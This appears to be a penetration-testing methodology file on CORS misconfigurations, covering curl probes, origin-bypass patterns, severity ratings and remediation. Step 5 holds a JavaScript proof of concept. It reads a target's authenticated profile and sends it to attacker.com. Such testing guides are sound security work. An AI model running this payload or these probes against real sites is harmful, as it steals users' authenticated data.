---
name: cors_misconfiguration
description: CORS misconfiguration testing covering origin reflection, null origin, and credential leakage
---

# CORS Misconfiguration

Cross-Origin Resource Sharing (CORS) misconfigurations allow attacker-controlled origins to read sensitive responses from APIs and authenticated endpoints.

## Attack Surface

**High-Value Targets**
- REST/GraphQL APIs returning user data, tokens, or PII
- Authenticated endpoints with `Access-Control-Allow-Credentials: true`
- Internal/staging APIs exposed to the internet

**Common Misconfigurations**
- Reflected `Origin` header with credentials allowed
- `Access-Control-Allow-Origin: null` accepted
- Wildcard `*` with credentials (browser blocks this, but check for proxy quirks)
- Partial-match origin validation (e.g., `evil-target.com` bypasses `target.com` suffix check)
- Pre-domain match bypass: `targetevilsite.com`

## Testing Methodology

### Step 1 – Baseline Request
```
curl -s -I -H "Origin: https://attacker.com" https://target.com/api/profile
```
Check if `Access-Control-Allow-Origin: https://attacker.com` is reflected.

### Step 2 – Credentials Check
```
curl -s -I -H "Origin: https://attacker.com" https://target.com/api/profile
```
If both of the following are present, it is exploitable:
- `Access-Control-Allow-Origin: https://attacker.com`
- `Access-Control-Allow-Credentials: true`

### Step 3 – Null Origin Test
```
curl -s -I -H "Origin: null" https://target.com/api/profile
```
Null origin can be triggered from sandboxed iframes.

### Step 4 – Subdomain / Prefix Bypass
Try origins:
- `https://target.com.attacker.com`
- `https://attackertarget.com`
- `https://sub.target.com` (if subdomains are trusted but one is compromised)

### Step 5 – Exploit PoC
```html
<script>
fetch("https://target.com/api/profile", {credentials: "include"})
  .then(r => r.text())
  .then(d => fetch("https://attacker.com/log?d=" + btoa(d)));
</script>
```

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Authenticated sensitive data returned with reflected origin + credentials | Critical |
| Internal API reachable from internet with wildcard | High |
| Unauthenticated endpoint only | Low |

## Remediation

- Maintain an explicit whitelist of allowed origins; never reflect the `Origin` header blindly
- Never combine `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- Reject `null` origin for credentialed requests
